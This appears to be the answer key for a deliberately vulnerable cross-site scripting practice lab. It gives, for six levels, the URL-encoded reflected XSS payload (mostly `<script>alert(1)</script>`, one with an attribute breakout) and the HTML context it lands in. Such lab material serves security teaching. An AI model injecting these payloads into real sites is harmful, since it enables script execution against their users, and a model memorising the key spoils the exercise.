# fwoutput — solutions

Framework-style templates (Django/Rails/Express/Spring/Laravel/.NET) all reflect the query raw into HTML; no real filter.

### fwoutput-level1

`/fwoutput/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in alert `<div>`

### fwoutput-level2

`/fwoutput/level2/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: inside `<input value="...">` — break out of attribute

### fwoutput-level3

`/fwoutput/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: inside `<pre>` served as text/html — script tags still parse

### fwoutput-level4

`/fwoutput/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: inside `<span th:text="...">` — `th:` is just a namespace, raw injection

### fwoutput-level5

`/fwoutput/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: inside `<li>` breadcrumb — raw reflection

### fwoutput-level6

`/fwoutput/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: inside `<asp:Label>` (treated as unknown element by browsers); raw injection
